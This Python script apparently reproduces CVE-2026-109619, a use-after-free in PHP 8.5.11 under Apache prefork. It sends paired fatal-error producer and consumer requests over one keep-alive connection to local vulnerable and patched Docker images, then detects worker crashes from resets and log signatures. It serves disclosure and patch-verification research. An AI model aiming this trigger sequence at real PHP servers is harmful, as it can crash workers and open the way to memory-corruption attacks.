#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Mail    : abraxas.null@proton.me
#
#  CVE: CVE-2026-109619 (Critical: 9.2)
#  Vendor: PHP (The PHP Group)
#  Versions: PHP 8.5.11 apache2handler (fixed in 8.5.12)
#  Impact: Unauth same-worker UAF via fatal backtrace then INI diagnostic
#  Requires: Apache prefork one worker; fatal_error_backtraces; loopback lab
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "CVE-2026-109619"
_EMAIL = "abraxas.null@proton.me"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Mail", _EMAIL),):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs"
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Loopback lab for CVE-2026-109619: stale worker-global UAF on Apache mod_php.

A fatal on PHP 8.5 publishes fatal_error_backtraces and never resets it.
The next request on the same prefork child applies a per-dir INI diagnostic
before php_request_startup() and consumes the dangling pointer.
php:8.5.11-apache resets the consumer; php:8.5.12-apache stays up.
"""

import http.client
import os
import socket
import subprocess
import time
from dataclasses import dataclass
from pathlib import Path

LABEL = "CVE-2026-109619"
WITNESS = "CVE-2026-109619-UAF-WITNESS"
COMPOSE_PROJECT = os.environ.get("COMPOSE_PROJECT_NAME", "cve-2026-109619")
HERE = Path(__file__).resolve().parent
HOST = "127.0.0.1"
SAPI = "apache2handler"
HOW = "backtrace"
USER_AGENT = "cve-2026-109619-lab"
ROUNDS = 8
TIMEOUT_S = 8.0
VULN_IMAGE = "php:8.5.11-apache"
PATCHED_IMAGE = "php:8.5.12-apache"
VULN_PORT = 18222
PATCHED_PORT = 18223
VULN_VERSION = "8.5.11"
PATCHED_VERSION = "8.5.12"
PRODUCER_PATH = "/producer.php"
CONSUMER_PATH = "/consumer.php"
PID_PATH = "/pid.php"

_RESET = (
    ConnectionResetError,
    ConnectionAbortedError,
    BrokenPipeError,
    http.client.RemoteDisconnected,
    http.client.IncompleteRead,
    http.client.BadStatusLine,
)
_TIMEOUT = (TimeoutError, socket.timeout)
_CRASH = (
    "addresssanitizer",
    "heap-use-after-free",
    "heap-buffer-overflow",
    "use-after-poison",
    "zend_mm_heap corrupted",
    "zend_mm_heap",
    "segmentation fault",
    "sigsegv",
    "signal 11",
    "core dumped",
    "fatal signal",
)


@dataclass(frozen=True, slots=True)
class Target:
    name: str
    port: int
    image: str
    version: str


@dataclass(frozen=True, slots=True)
class HttpResult:
    complete: bool
    reset: bool
    timeout: bool
    status: int | None
    body: bytes
    headers: dict[str, str]
    error: str
    pid: str

    @staticmethod
    def blank(error: str = "not-started") -> "HttpResult":
        return HttpResult(False, False, False, None, b"", {}, error, "")

    @property
    def text(self) -> str:
        return self.body.decode("utf-8", errors="replace")


VULN = Target("vuln", VULN_PORT, VULN_IMAGE, VULN_VERSION)
PATCHED = Target("patched", PATCHED_PORT, PATCHED_IMAGE, PATCHED_VERSION)


def log(msg: str) -> None:
    print(msg, flush=True)


def fail(reason: str) -> int:
    log(f"FAIL {LABEL} {reason} {WITNESS}")
    return 1


def clip(text: str, limit: int = 220) -> str:
    compact = text.replace("\r\n", "\\n").replace("\n", "\\n")
    if len(compact) > limit:
        return compact[:limit] + "..."
    return compact


def compose(*args: str, timeout: int = 60) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["docker", "compose", "-p", COMPOSE_PROJECT, *args],
        cwd=HERE,
        text=True,
        capture_output=True,
        timeout=timeout,
        check=False,
    )


def service_logs(service: str) -> str:
    proc = compose("logs", "--no-color", "--tail", "400", service, timeout=30)
    return (proc.stdout or "") + (proc.stderr or "")


def service_status() -> str:
    proc = compose("ps", "-a", "--format", "{{.Service}} {{.Status}}", timeout=30)
    return ((proc.stdout or "") + (proc.stderr or "")).strip()


def _headers(resp: http.client.HTTPResponse) -> dict[str, str]:
    return {key.lower(): value for key, value in resp.getheaders()}


def _from_response(resp: http.client.HTTPResponse) -> HttpResult:
    headers = _headers(resp)
    return HttpResult(
        complete=True,
        reset=False,
        timeout=False,
        status=int(resp.status),
        body=resp.read(),
        headers=headers,
        error="",
        pid=headers.get("x-worker-pid", ""),
    )


def _from_exc(exc: BaseException, pid: str = "") -> HttpResult:
    if isinstance(exc, _TIMEOUT):
        return HttpResult(False, False, True, None, b"", {}, "timeout", pid)
    err = str(exc)
    reset = isinstance(exc, _RESET) or any(
        tok in err.lower()
        for tok in ("reset", "broken pipe", "connection abort", "refused", "empty")
    )
    return HttpResult(False, reset, False, None, b"", {}, err, pid)


def _request(conn: http.client.HTTPConnection, path: str, *, keep_alive: bool) -> HttpResult:
    conn.request(
        "GET",
        path,
        headers={
            "Host": HOST,
            "Connection": "keep-alive" if keep_alive else "close",
            "User-Agent": USER_AGENT,
        },
    )
    return _from_response(conn.getresponse())


def http_get(port: int, path: str) -> HttpResult:
    conn = http.client.HTTPConnection(HOST, port, timeout=TIMEOUT_S)
    try:
        return _request(conn, path, keep_alive=False)
    except OSError as exc:
        return _from_exc(exc)
    finally:
        conn.close()


def two_phase(port: int) -> tuple[HttpResult, HttpResult]:
    """Producer then consumer on one HTTP/1.1 connection (same worker)."""
    producer = HttpResult.blank()
    consumer = HttpResult.blank()
    conn = http.client.HTTPConnection(HOST, port, timeout=TIMEOUT_S)
    try:
        producer = _request(conn, PRODUCER_PATH, keep_alive=True)
        consumer = _request(conn, CONSUMER_PATH, keep_alive=False)
    except OSError as exc:
        failed = _from_exc(exc, producer.pid)
        if not producer.complete:
            producer = failed
        else:
            consumer = failed
    finally:
        try:
            conn.close()
        except OSError:
            pass
    return producer, consumer


def summarize(name: str, result: HttpResult) -> None:
    log(
        f"{name} complete={int(result.complete)} reset={int(result.reset)} "
        f"timeout={int(result.timeout)} status={result.status} pid={result.pid!r} "
        f"error={result.error!r} body={clip(result.text)!r}"
    )


def crash_needles(blob: str) -> list[str]:
    low = blob.lower()
    return [needle for needle in _CRASH if needle in low]


def ioc_lines(service: str, logs: str, status: str) -> None:
    log(f"IOC {service}-status {status!r}")
    hits = 0
    for line in logs.splitlines():
        low = line.lower()
        if not any(tok in low for tok in ("zend_mm", "segfault", "sigsegv", "fatal error", "abort")):
            continue
        log(f"IOC {service}-log {line.strip()[:320]}")
        hits += 1
        if hits >= 16:
            break


def producer_ok(result: HttpResult) -> bool:
    if result.reset or result.timeout:
        return False
    return "Fatal error" in result.text or (result.status is not None and result.status >= 500)


def consumer_alive(result: HttpResult) -> bool:
    return (
        result.complete
        and not result.reset
        and not result.timeout
        and result.status == 200
        and "consumer-ok" in result.text
    )


def consumer_uaf(result: HttpResult, logs: str) -> tuple[bool, str]:
    if consumer_alive(result):
        return False, "consumer-200"
    if result.reset:
        return True, "connection-reset"
    hits = crash_needles(logs) + crash_needles(result.text) + crash_needles(result.error)
    if any("zend_mm" in item for item in hits):
        return True, "zend-mm-corrupt"
    if any("addresssanitizer" in item or "use-after" in item or "poison" in item for item in hits):
        return True, "asan"
    if any("segmentation" in item or "sigsegv" in item or "signal 11" in item for item in hits):
        return True, "segfault"
    if result.timeout and not result.complete:
        return True, "timeout-incomplete"
    if not result.complete:
        return True, "incomplete"
    return False, "consumer-completed"


def ready(port: int) -> HttpResult:
    return http_get(port, PID_PATH)


def _ready_ok(result: HttpResult, version: str) -> str | None:
    if not result.complete or "ok" not in result.text:
        return "not-ready"
    if SAPI not in result.text:
        return "sapi-mismatch"
    if version not in result.text:
        return "version-mismatch"
    return None


def main() -> int:
    log(
        f"label={LABEL} vuln={HOST}:{VULN.port} patched={HOST}:{PATCHED.port} "
        f"images={VULN.image},{PATCHED.image} sapi={SAPI} how={HOW} pin=same-worker"
    )

    vuln_ready = ready(VULN.port)
    patched_ready = ready(PATCHED.port)
    summarize("vuln-ready", vuln_ready)
    summarize("patched-ready", patched_ready)
    for target, probe in ((VULN, vuln_ready), (PATCHED, patched_ready)):
        reason = _ready_ok(probe, target.version)
        if reason is None:
            continue
        ioc_lines(target.name, service_logs(target.name), service_status())
        prefix = "vuln" if target is VULN else "patched"
        if reason == "version-mismatch":
            return fail(f"{prefix}-version-mismatch")
        if reason == "sapi-mismatch":
            return fail("sapi-mismatch")
        return fail(f"{prefix}-not-ready")

    log("== patched two-phase ==")
    patched_prod, patched_cons = two_phase(PATCHED.port)
    summarize("patched-producer", patched_prod)
    summarize("patched-consumer", patched_cons)
    if not producer_ok(patched_prod):
        ioc_lines(PATCHED.name, service_logs(PATCHED.name), service_status())
        return fail("patched-producer-failed")
    if not consumer_alive(patched_cons):
        ioc_lines(PATCHED.name, service_logs(PATCHED.name), service_status())
        return fail("patched-consumer-crashed")
    patched_after = ready(PATCHED.port)
    summarize("patched-after", patched_after)
    if not patched_after.complete or "ok" not in patched_after.text:
        return fail("patched-not-ok")

    log("== vuln two-phase ==")
    vuln_uaf = False
    vuln_how = "none"
    last_prod = HttpResult.blank("none")
    last_cons = HttpResult.blank("none")
    for round_i in range(1, ROUNDS + 1):
        last_prod, last_cons = two_phase(VULN.port)
        summarize(f"vuln-producer-{round_i}", last_prod)
        summarize(f"vuln-consumer-{round_i}", last_cons)
        hit, how = consumer_uaf(last_cons, service_logs(VULN.name))
        log(f"vuln-round={round_i} uaf={int(hit)} how={how}")
        if hit:
            vuln_uaf = True
            vuln_how = how
            break
        if last_prod.reset or last_prod.timeout:
            vuln_uaf = True
            vuln_how = "producer-crash"
            break
        time.sleep(0.2)

    status = service_status()
    ioc_lines(VULN.name, service_logs(VULN.name), status)
    ioc_lines(PATCHED.name, service_logs(PATCHED.name), status)

    if not producer_ok(last_prod) and not vuln_uaf:
        return fail("vuln-producer-failed")
    if not vuln_uaf:
        return fail("vuln-no-uaf")
    if not consumer_alive(patched_cons):
        return fail("patched-not-ok")

    log(
        f"SUCCESS {LABEL} vuln-uaf=yes vuln-crash=yes patched-ok=yes "
        f"sapi={SAPI} pin=same-worker vuln-image={VULN.image} "
        f"patched-image={PATCHED.image} how={HOW} crash={vuln_how} "
        f"{WITNESS}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

